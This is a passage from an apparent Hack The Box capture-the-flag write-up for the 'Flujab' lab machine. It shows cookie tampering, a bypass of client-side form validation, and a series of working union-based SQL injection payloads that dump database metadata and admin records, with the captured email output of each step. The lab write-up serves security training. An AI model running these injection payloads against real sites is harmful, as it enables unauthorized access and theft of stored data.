+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;so-i-added-the-info-about-expiration-max-age-and-path-to-my-cookies-and-tried-again-&quot;&gt;So I added the info about expiration, max age and path to my cookies and tried again :&lt;/h4&gt;
+&lt;h4 id=&quot;request--4&quot;&gt;Request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /?cancel HTTP/1.1
+Host: freeflujab.htb
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
+Connection: close
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;response--3&quot;&gt;Response :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Thu, 13 Jun 2019 13:58:23 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Server: ClownWare Proxy
+Content-Length: 5128
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/52.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/flujab/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;to-cancel-an-appointment-we-need-to-provide-the-nhs-number-of-the-patient-however-like-on-the-smtp-configuration-page-it-used-client-side-validation-check-&quot;&gt;To cancel an appointment we need to provide the NHS number of the patient. However like on the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; configuration page it used client-side validation check :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;input type=&quot;text&quot; name=&quot;nhsnum&quot; placeholder=&quot;NHS Number Required&quot; pattern=&quot;NHS-\d{3}-\d{3}-\d{4}&quot; title=&quot; A Valid NHS Number Is Required e.g. NHS-012-345-6789&quot; required&amp;gt;&amp;lt;/br&amp;gt;
+  &amp;lt;ul class=&quot;actions&quot;&amp;gt;
+    &amp;lt;center&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Cancel Appointment&quot; name=&quot;submit&quot; /&amp;gt;&amp;lt;/center&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;request--5&quot;&gt;Request :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /?cancel HTTP/1.1
+Host: freeflujab.htb
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://freeflujab.htb/?cancel
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+nhsnum=test&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;response--4&quot;&gt;Response :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Date: Thu, 13 Jun 2019 14:13:42 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Server: ClownWare Proxy
+Content-Length: 5204
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;now-if-we-check-the-smtp-server-we-can-see-that-the-cancellation-email-was-sent-successfully-&quot;&gt;Now if we check the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; server we can see that the cancellation email was sent successfully :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:13:40 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:
+Message-ID: &amp;lt;219504b93c84fb0e94fef1ae3d31707d@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : test
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;sqli&quot;&gt;SQLi&lt;/h3&gt;
+&lt;h4 id=&quot;i-tried-to-play-around-with-that-input-nhsnum-i-tried-a-lot-of-stuff-and-when-i-tried-union-based-sql-injection-i-got-a-hit-a-good-reference&quot;&gt;I tried to play around with that input (&lt;code class=&quot;highlighter-rouge&quot;&gt;nhsnum&lt;/code&gt;), I tried a lot of stuff and when I tried union based &lt;code class=&quot;highlighter-rouge&quot;&gt;sql&lt;/code&gt; injection I got a hit (a good &lt;a href=&quot;http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html&quot;&gt;reference&lt;/a&gt;):&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@datadir,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-payload-prints-the-data-directory&quot;&gt;This payload prints the data directory.&lt;/h4&gt;
+&lt;h4 id=&quot;smtp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:20:32 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:/var/lib/mysql/
+Message-ID: &amp;lt;9bcabe79f1782598002cc31abc3bb333@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,@@datadir,4,5;#
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;database-version-&quot;&gt;Database version :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,@@version,4,5;#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:24:50 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
+Message-ID: &amp;lt;d2e238de2ef64c5dd385e30472c94d5e@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,@@version,4,5;#
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;great-lets-get-the-table-name-&quot;&gt;Great. Let’s get the table name :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--2&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:28:15 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:admin
+Message-ID: &amp;lt;e389b6f96e0104edf7b12bd167666fb3@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--                              
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;table-name-is-admin-lets-get-the-column-names-&quot;&gt;Table name is &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; let’s get the column names :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--3&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:38:55 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:id
+Message-ID: &amp;lt;50be6357006cbedc546152de64cd5407@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--     
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-gave-us-the-first-column-name-which-is-id-to-get-the-rest-of-the-column-names-we-will-add-and-column_nameprevious-column-name-here&quot;&gt;This gave us the first column name which is &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt;, to get the rest of the column names we will add &lt;code class=&quot;highlighter-rouge&quot;&gt;and column_name!='PREVIOUS COLUMN NAME HERE'&lt;/code&gt;.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--4&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:41:26 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:loginname
+Message-ID: &amp;lt;3d6a306c2827c5d6b3e44ae2c9602d2e@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;second-column--loginname&quot;&gt;Second column : &lt;code class=&quot;highlighter-rouge&quot;&gt;loginname&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--5&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:44:08 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:namelc
+Message-ID: &amp;lt;8a8dbbfb4a4c3a0968c819bc9e188e6c@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;third-column--namelc&quot;&gt;Third column : &lt;code class=&quot;highlighter-rouge&quot;&gt;namelc&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--6&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:46:45 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:email
+Message-ID: &amp;lt;087443e0a9489da3ec320a89cc3df41b@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--                                                                    
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;fourth-column--email&quot;&gt;Fourth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;email&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/73.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--+&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--7&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/74.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 15:48:47 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:access
+Message-ID: &amp;lt;f2306132c2238cf545023e952591045d@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
+    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--                                           
+    Code   : Influ-022
+    Type   : Injection
+    Stat   : CANCELED
+    LOC    : Crick026
+  ________________________
+
+  Your flu jab appointment has been canceled.
+  Have a nice day,
+
+  Nurse Julie Walters
+  Senior Staff Nurse
+  Cricklestone Doctors Surgery
+  NHS England.
+
+
+------------ END MESSAGE ------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;fifth-column--access&quot;&gt;Fifth column : &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;i-stopped-right-there-to-see-if-thats-enough-lets-see-what-data-can-we-get-from-these-columns&quot;&gt;I stopped right there to see if that’s enough, let’s see what data can we get from these columns.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/75.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nhsnum=' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#&amp;amp;submit=Cancel+Appointment&amp;amp;submit=Cancel+Appointment
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;smtp--8&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/76.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------- MESSAGE FOLLOWS ----------
+Date: Thu, 13 Jun 2019 16:01:53 +0100
+To: cancelations@no-reply.flujab.htb
+From: Nurse Julie Walters &amp;lt;DutyNurse@flujab.htb&amp;gt;
+Subject: Flu Jab Appointment - Ref:sysadm:administrator:syadmin@flujab.htb:sysadmin-console-01.flujab.htb                                  
+Message-ID: &amp;lt;547797c2649862cadc98c5c5e345208b@freeflujab.htb&amp;gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=iso-8859-1
+X-Peer: 10.10.10.124
+
+    CANCELLATION NOTICE!
+  ________________________
+
+    VACCINATION
+    Routine Priority
+    ------------------
